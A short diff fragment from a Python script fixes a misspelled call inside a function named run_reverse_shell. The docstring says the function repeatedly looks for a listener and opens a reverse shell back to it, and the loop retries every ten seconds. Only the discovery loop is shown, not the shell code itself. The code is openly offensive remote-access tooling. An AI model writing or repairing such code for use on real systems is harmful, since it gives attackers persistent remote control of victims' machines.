@@ -36,7 +36,7 @@ def discover_listener_ip(port: int) -> str | None:
 def run_reverse_shell(port: int = 4444) -> None:
     """Continuously attempts to discover a listener and establish a reverse shell."""
     while True:
-        target_host = discozver_listener_ip(port)
+        target_host = discover_listener_ip(port)
         if not target_host:
             time.sleep(10)  # Wait before retrying discovery
             continue
